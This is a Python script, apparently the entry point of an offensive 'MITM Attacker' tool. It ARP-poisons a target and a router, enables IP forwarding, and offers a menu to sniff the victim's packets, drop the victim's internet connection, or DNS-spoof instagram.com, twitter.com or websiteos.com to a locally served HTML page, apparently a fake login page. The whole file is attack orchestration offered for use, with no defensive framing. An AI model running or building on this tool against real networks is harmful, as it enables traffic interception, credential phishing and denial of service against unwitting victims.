import argparse
import time
import threading
from colorama import Fore
import sys
import signal
from arp_spoof import arp_spoof, restore
from packet_listener import packet_sniffing
from dns_spoof import enable_ip_forward, start_dns_spoof, stop_dns_spoof, dns_spoof, move_html_file, dns_drop
from welcome import print_ascii_art

# Event to signal threads to exit
exit_event = threading.Event()


def handle_keyboard_interrupt(signum, frame):
    print(Fore.RED + "\n[+] Stopping the program..." + Fore.RESET)
    restore(args.target_ip, args.router_ip)
    print(Fore.RED + "[+] Target IP Table restored." + Fore.RESET)
    stop_dns_spoof()
    # Set the exit event for all threads
    exit_event.set()
    sys.exit(0)


def arp_spoof_with_exit_event(target_ip, router_ip):
    try:
        arp_spoof(target_ip, router_ip)
    except KeyboardInterrupt:
        exit_event.set()

def packet_sniffing_with_exit_event(args):
    try:
        packet_sniffing(args)
    except KeyboardInterrupt:
        exit_event.set()


def dns_spoof_with_exit_event(domain, local_ip, args):
    try:
        dns_spoof(domain, local_ip, args)
    except KeyboardInterrupt:
        exit_event.set()


if __name__ == "__main__":
    try:
        print_ascii_art()

        parser = argparse.ArgumentParser(description="MITM Attacker")
        parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
        parser.add_argument("-r", "--router", dest="router_ip", help="Router IP address")
        parser.add_argument("-l", "--local", dest="local_ip", help="Your IP address")
        args = parser.parse_args()

        if not args.target_ip or not args.router_ip:
            parser.error("Please specify both target and router IP addresses.")

        # Enable IP forwarding
        enable_ip_forward()

        print(Fore.YELLOW + "[+] ARP poisoning attack is starting..." + Fore.RESET)

        arp_thread = threading.Thread(target=arp_spoof_with_exit_event, args=(args.target_ip, args.router_ip))
        arp_thread.start()

        time.sleep(2)

        print(Fore.YELLOW + "[+] ARP poisoning attack continues." + Fore.RESET)

        # Catch KeyboardInterrupt for each thread
        signal.signal(signal.SIGINT, handle_keyboard_interrupt)

        while not exit_event.is_set():
            choice = input(Fore.BLUE +
                "What do you want to do?\n1. Listen to packets\n2. Drop victim's internet\n3. DNS Spoof\nEnter your choice (1, 2, 3, or 'exit' to quit): " + Fore.RESET)

            if choice == "1":
                print(Fore.GREEN + "[+] Starting packet sniffing..." + Fore.RESET)
                sniff_thread = threading.Thread(target=packet_sniffing_with_exit_event, args=(args,))
                sniff_thread.start()
                time.sleep(5)
                sniff_thread.join()

            elif choice == "2":
                print(Fore.GREEN + "[+] Dropping victim's internet..." + Fore.RESET)
                start_dns_spoof()
                dns_drop()
                stop_dns_spoof()

            elif choice == "3":
                print(Fore.GREEN + "[+] DNS Spoof attack is starting..." + Fore.RESET)
                start_dns_spoof()
                print("Choose a domain to spoof:")
                print("1) instagram.com")
                print("2) websiteos.com")
                print("3) twitter.com")
                domain_choice = input("Enter your choice (1, 2, 3): ")

                if domain_choice == "1":
                    move_html_file("instagram")
                    dns_thread = threading.Thread(target=dns_spoof_with_exit_event, args=(bytes("instagram.com", 'utf-8'), args.local_ip, args))
                    dns_thread.start()
                    dns_thread.join()
                elif domain_choice == "2":
                    move_html_file("websiteos")
                    dns_thread = threading.Thread(target=dns_spoof_with_exit_event, args=(bytes("websiteos.com", 'utf-8'), args.local_ip, args))
                    dns_thread.start()
                    dns_thread.join()
                elif domain_choice == "3":
                    move_html_file("twitter")
                    dns_thread = threading.Thread(target=dns_spoof_with_exit_event, args=(bytes("twitter.com", 'utf-8'), args.local_ip, args))
                    dns_thread.start()
                    dns_thread.join()
                else:
                    print("[-] Invalid choice. Please enter 1, 2, or 3")

    except KeyboardInterrupt:
        handle_keyboard_interrupt()
    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")
